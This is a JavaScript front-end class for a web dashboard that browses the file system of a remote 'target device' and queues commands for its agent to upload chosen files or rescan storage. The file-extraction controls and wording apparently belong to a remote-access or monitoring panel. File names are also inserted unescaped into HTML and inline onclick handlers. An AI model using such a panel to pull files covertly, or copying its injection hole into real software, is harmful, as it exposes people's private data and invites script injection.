class FilesEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.currentPath = '/';
        this.init();
    }

    async init() {
        // 🚀 FIX: Embedded the core missing active device dynamic population engine
        await this.loadDevicesList();
        if (!this.activeDeviceId) return;
        this.fetchDirectory(this.currentPath);
    }

    async loadDevicesList() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();

            if (result.status === 'success') {
                const selectEl = document.getElementById('device-select');
                if (selectEl) {
                    selectEl.innerHTML = ''; 
                    if (result.data.length === 0) {
                        selectEl.innerHTML = '<option value="">No Devices Found</option>';
                        return;
                    }
                    result.data.forEach(dev => {
                        const option = document.createElement('option');
                        option.value = dev.id;
                        option.textContent = dev.name;
                        selectEl.appendChild(option);
                    });
                    if (!this.activeDeviceId && result.data.length > 0) {
                        this.activeDeviceId = result.data[0].id;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                    }
                    selectEl.value = this.activeDeviceId;
                    selectEl.addEventListener('change', (e) => {
                        this.activeDeviceId = e.target.value;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                        this.currentPath = '/'; // Reset path home on device switch
                        this.fetchDirectory(this.currentPath); 
                    });
                }
            }
        } catch (e) {
            console.error("Failed to load device matrices:", e);
        }
    }

    async fetchDirectory(path) {
        const token = localStorage.getItem('owner_token');
        const container = document.getElementById('files-list');
        
        container.innerHTML = `
            <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
                <i data-lucide="loader" class="spin" style="width: 40px; height: 40px; margin-bottom: 15px;"></i><br>
                Scanning safe sandbox storage layer...
            </div>`;
            
        document.getElementById('path-breadcrumb').style.display = 'flex';

        try {
            const encodedPath = encodeURIComponent(path);
            const res = await fetch(`/api/files?device_id=${this.activeDeviceId}&path=${encodedPath}`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            
            if (result.status === 'success') {
                this.updateBreadcrumb(path);
                this.renderFiles(result.data);
            } else {
                container.innerHTML = `<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px;">System Error: ${result.message}</div>`;
            }
        } catch (e) {
            container.innerHTML = '<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px;">Network failure establishing directory stream tunnel.</div>';
        }
    }

    renderFiles(items) {
        const container = document.getElementById('files-list');
        
        if (items.length === 0) {
            container.innerHTML = `
                <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
                    <i data-lucide="folder-open" style="width: 48px; height: 48px; opacity: 0.3; margin-bottom: 10px;"></i><br>
                    No content indexed in this catalog direction.
                </div>`;
            lucide.createIcons();
            return;
        }

        container.innerHTML = items.map(item => {
            const isFolder = item.is_directory === true || item.type === 'directory';
            const icon = isFolder ? 'folder' : this.getFileIcon(item.file_name);
            const iconColor = isFolder ? 'var(--accent-cyan)' : 'var(--text-main)';
            
            // Core safety constraint: Block tracking items > 12MB to avoid network abuse
            const sizeInBytes = item.size_bytes || 0;
            const sizeLimit = 12 * 1024 * 1024; 
            const isOversized = !isFolder && sizeInBytes > sizeLimit;
            
            let clickAction = '';
            let extraClass = '';
            let badgeHtml = '';

            if (isFolder) {
                clickAction = `window.filesEngine.openFolder('${item.file_name}')`;
            } else if (isOversized) {
                clickAction = `alert('Strict Policy: File size exceeds the 12MB optimization limit to safeguard target battery assets.')`;
                extraClass = 'blocked';
                badgeHtml = `<span class="status-badge badge-blocked">> 12MB</span>`;
            } else {
                const fullPath = this.currentPath === '/' ? `/${item.file_name}` : `${this.currentPath}/${item.file_name}`;
                const fileUrl = item.file_url ? `'${item.file_url}'` : 'null';
                clickAction = `window.filesEngine.downloadOrRequestFile('${item.file_name}', '${fullPath}', ${fileUrl})`;
                
                if (item.file_url) {
                    badgeHtml = `<span class="status-badge badge-ready">Ready</span>`;
                } else {
                    badgeHtml = `<span class="status-badge badge-cloud"><i data-lucide="cloud" style="width:12px; height:12px;"></i></span>`;
                }
            }

            const displaySize = isFolder ? 'Folder' : ((sizeInBytes / (1024 * 1024)).toFixed(2) + ' MB');

            return `
            <div class="file-item ${extraClass}" onclick="${clickAction}">
                ${badgeHtml}
                <i data-lucide="${icon}" class="file-icon" style="color: ${iconColor};"></i>
                <div style="width: 100%;">
                    <div class="file-name" title="${item.file_name}">${item.file_name}</div>
                    <div class="file-meta">${displaySize}</div>
                </div>
            </div>
            `;
        }).join('');
        
        lucide.createIcons();
    }

    getFileIcon(filename) {
        if (!filename) return 'file';
        const ext = filename.split('.').pop().toLowerCase();
        if (['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext)) return 'image';
        if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) return 'film';
        if (['pdf', 'doc', 'docx', 'txt', 'csv'].includes(ext)) return 'file-text';
        if (['zip', 'rar', 'apk', 'tar'].includes(ext)) return 'package';
        return 'file';
    }

    openFolder(folderName) {
        this.currentPath = this.currentPath === '/' ? `/${folderName}` : `${this.currentPath}/${folderName}`;
        this.fetchDirectory(this.currentPath);
    }

    goUp() {
        if (this.currentPath === '/') return; 
        const pathParts = this.currentPath.split('/').filter(p => p !== '');
        pathParts.pop(); 
        this.currentPath = pathParts.length === 0 ? '/' : '/' + pathParts.join('/');
        this.fetchDirectory(this.currentPath);
    }

    updateBreadcrumb(path) {
        document.getElementById('current-path-text').innerText = path;
    }

    async downloadOrRequestFile(fileName, fullPath, fileUrl) {
        if (fileUrl && fileUrl.startsWith('http')) {
            window.open(fileUrl, '_blank');
            return;
        }

        const isConfirmed = confirm(`Trigger background file extraction?\n\nTarget device agent will securely sync "${fileName}" onto the dashboard storage cloud allocation.`);
        if (!isConfirmed) return;

        const token = localStorage.getItem('owner_token');

        try {
            const res = await fetch(`/api/devices/${this.activeDeviceId}/action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
                body: JSON.stringify({ 
                    action: `upload_specific_file:${fullPath}` 
                })
            });

            const data = await res.json();
            if (data.status === 'success') {
                alert(`Extraction command dispatched to queue! The file badge will switch to "Ready" once fully uploaded.`);
            } else {
                alert(`Command Execution Failed: ${data.message}`);
            }
        } catch (error) {
            alert('Action Gateway Unreachable.');
        }
    }
}

window.filesEngine = null;

window.requestStorageSync = async function() {
    const isConfirmed = confirm("Dispatch deep scan directive onto target context filesystem?");
    if (!isConfirmed) return;

    const token = localStorage.getItem('owner_token');
    const deviceId = localStorage.getItem('active_device_id');

    try {
        await fetch(`/api/devices/${deviceId}/action`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
            body: JSON.stringify({ action: "sync_file_tree" })
        });
        alert("Deep Scan transaction injected successfully.");
    } catch (e) {
        alert("Failed to reach processing cluster.");
    }
};

document.addEventListener('DOMContentLoaded', () => {
    window.filesEngine = new FilesEngine();
});
